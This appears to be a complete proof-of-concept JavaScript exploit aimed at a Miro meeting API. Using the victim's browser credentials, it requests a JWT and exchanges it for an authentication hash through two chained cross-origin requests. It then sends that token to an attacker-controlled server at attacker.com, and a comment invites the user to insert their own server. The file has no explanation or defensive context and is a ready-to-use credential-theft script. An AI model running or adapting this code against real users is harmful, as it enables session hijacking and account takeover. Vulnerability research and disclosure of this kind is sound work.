const ATTACKER_SERVER = "https://attacker.com"; // Write your server address here

const getJwt = function () {
  return new Promise((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.open(
      "POST",
      "https://api.meet.miro.com/api/v1/public/miro/auth/jwt/generate"
    );
    xhr.withCredentials = true;
    xhr.addEventListener("readystatechange", function () {
      if (xhr.readyState === xhr.DONE) {
        const JWT = JSON.parse(xhr.responseText).jwt;
        resolve(JWT);
      }
    });
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send();
  });
};

const getAuthCookie = async function () {
  const JWT = await getJwt();
  const xhr = new XMLHttpRequest();
  xhr.open(
    "POST",
    "https://api.meet.miro.com/api/v1/public/miro/auth/jwt/login"
  );
  xhr.withCredentials = true;
  xhr.addEventListener("readystatechange", function () {
    if (xhr.readyState === xhr.DONE) {
      const authCookie = JSON.parse(xhr.responseText).hash;
      fetch(ATTACKER_SERVER + "?data=" + authCookie);
    }
  });
  xhr.setRequestHeader("Content-Type", "application/json");
  const data = JSON.stringify({ jwt: JWT });
  xhr.send(data);
};

getAuthCookie();
